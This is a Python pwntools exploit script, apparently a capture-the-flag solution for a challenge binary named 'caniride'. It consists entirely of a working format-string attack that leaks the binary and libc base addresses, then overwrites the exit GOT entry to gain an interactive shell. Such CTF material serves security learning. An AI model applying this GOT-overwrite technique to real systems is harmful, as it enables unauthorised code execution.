from pwn import *


context.log_level="debug"
context.terminal=['konsole', '-e']

p = gdb.debug("./caniride", "c")
p = remote("challs.actf.co", 31228)
e = ELF("./caniride")
libc = ELF("./libc.so.6")

# bio input starts at #16
exp = "%*16$p%17$hn%*18$p%19$hn%*20$p%21$hn_%27$p"

print("exp len", len(exp))
assert len(exp) < 49
p.sendline(exp)

p.sendline("-3")


p.recvuntil("this is ")

leak = u64(p.recv(6)+"\x00\x00")
print(hex(leak))

e.address = leak - 0x35a8

print("leak", hex(leak))
print("Binary base", hex(e.address))

print("main @", hex(e.sym["main"]))
print("exit @", hex(e.got["exit"]))


pairs = [
    [e.sym["main"] & 0xffff, e.got["exit"]],
    [(e.sym["main"] & 0xffff0000) >> 16, e.got["exit"]+2],
    [(e.sym["main"] & 0xffff00000000) >> 32, e.got["exit"]+4],
]

pairs.sort(key=lambda x: x[0])

data = ""

print(hex(pairs[0][0]), hex(pairs[0][1]))

data += p64(pairs[0][0]) + p64(pairs[0][1])
data += p64(pairs[1][0] - pairs[0][0]) + p64(pairs[1][1])
data += p64(pairs[2][0] - pairs[1][0]) + p64(pairs[2][1])



p.sendline(data)

p.recvuntil("_")

libc.address = eval(p.recv(14)) - 0x206bcc


print("libc", hex(libc.address))





# shell
exp = "%*16$p%17$hn%*18$p%19$hn%*20$p%21$hn"

print("exp len", len(exp))
assert len(exp) < 49
p.sendline(exp)

p.sendline("2")


addr = libc.address + 0xe3b31

pairs = [
    [addr & 0xffff, e.got["exit"]],
    [(addr & 0xffff0000) >> 16, e.got["exit"]+2],
    [(addr & 0xffff00000000) >> 32, e.got["exit"]+4],
]

pairs.sort(key=lambda x: x[0])

data = ""

print(hex(pairs[0][0]), hex(pairs[0][1]))

data += p64(pairs[0][0]) + p64(pairs[0][1])
data += p64(pairs[1][0] - pairs[0][0]) + p64(pairs[1][1])
data += p64(pairs[2][0] - pairs[1][0]) + p64(pairs[2][1])

p.sendline(data)


p.interactive()

